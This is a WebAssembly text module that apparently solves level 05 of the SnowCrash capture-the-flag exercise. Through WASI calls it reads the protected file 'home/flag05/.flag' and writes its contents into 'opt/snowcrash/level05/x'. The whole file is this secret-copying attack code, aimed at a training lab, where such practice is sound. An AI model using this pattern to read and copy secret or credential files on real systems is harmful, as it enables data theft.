(module
  (import "wasi_snapshot_preview1" "path_open"
    (func $path_open (param i32 i32 i32 i32 i32 i64 i64 i32 i32) (result i32)))
  (import "wasi_snapshot_preview1" "fd_read"
    (func $fd_read (param i32 i32 i32 i32) (result i32)))
  (import "wasi_snapshot_preview1" "fd_write"
    (func $fd_write (param i32 i32 i32 i32) (result i32)))
  (memory (export "memory") 1)
  (data (i32.const 0) "home/flag05/.flag")
  (data (i32.const 32) "opt/snowcrash/level05/x")
  (func (export "_start")
    i32.const 3
    i32.const 0
    i32.const 0
    i32.const 17
    i32.const 0
    i64.const 2
    i64.const 0
    i32.const 0
    i32.const 80
    call $path_open
    drop
    i32.const 64
    i32.const 128
    i32.store
    i32.const 68
    i32.const 64
    i32.store
    i32.const 72
    i32.const 0
    i32.store
    i32.const 80
    i32.load
    i32.const 64
    i32.const 1
    i32.const 72
    call $fd_read
    drop
    i32.const 3
    i32.const 0
    i32.const 32
    i32.const 23
    i32.const 9
    i64.const 64
    i64.const 0
    i32.const 0
    i32.const 84
    call $path_open
    drop
    i32.const 68
    i32.const 72
    i32.load
    i32.store
    i32.const 84
    i32.load
    i32.const 64
    i32.const 1
    i32.const 76
    call $fd_write
    drop
  )
)
